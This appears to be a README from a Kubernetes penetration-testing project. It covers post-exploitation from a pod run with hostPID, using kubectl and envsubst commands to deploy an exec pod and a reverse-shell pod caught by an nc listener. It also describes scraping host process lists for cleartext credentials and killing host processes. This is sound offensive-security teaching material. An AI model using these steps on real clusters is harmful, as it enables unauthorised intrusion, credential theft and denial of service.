# Bad Pod #5: hostPID 

There’s no clear path to get root on the node with only `hostPID`, but there are still some good post exploitation opportunities.  
*	**View processes on the host** – When you run ps from within a pod that has hostPID: true, you see all the processes running on the host, including processes running within each pod. 
*	**Look for passwords, tokens, keys, etc.** – If you are lucky, you will find credentials and you’ll be able to use them to escalate privileges within the cluster, to services supported by the cluster, or to services that cluster-hosted applications are communicating with. It is a long shot, but you might find a Kubernetes service account token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster admin. 
*	**Kill processes** – You can also kill any process on the node (presenting a denial-of-service risk), but I would advise against it on a penetration test!


# Pod Creation
## Create a pod you can exec into
Create pod
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml 
```
Exec into pod 
```bash
kubectl exec -it hostpid-exec-pod -- bash
```

## Reverse shell pod

Set up listener
```bash
nc -nvlp 3116
```

Create pod from local manifest without modifying it by using env variables and envsubst
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/hostpid/pod/hostpid-revshell-pod.yaml | kubectl apply -f -
```

Catch the shell
```bash
$ nc -nvlp 3116
Listening on 0.0.0.0 3116
Connection received on 10.0.0.162 42035
```

# Post exploitation

#### View all processes running on the host and look for passwords, tokens, keys, etc. 
```bash
ps -aux
...omitted for brevity...
root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c while true; do ./my-program --grafana-uername=admin --grafana-password=admin; sleep 10;done
...omitted for brevity...
```
Check out that clear text password in the ps output below! 

#### Also, you can also kill any process, but don't do that in production :)

#### Attacks that apply to all pods, even without any special permissions
* Cloud metadata service
* `Kube-apiserver` or `kubelet` with `anonymous-auth` enabled
* Kubernetes exploits
* Hunting for vulnerable application/services in the cluster

# Demonstrate impact

If you are performing a penetration test, the end goal is not to gain cluster-admin, but rather to demonstrate the impact of exploitation. Use the access you have gained to accomplish the objectives of the penetration test.

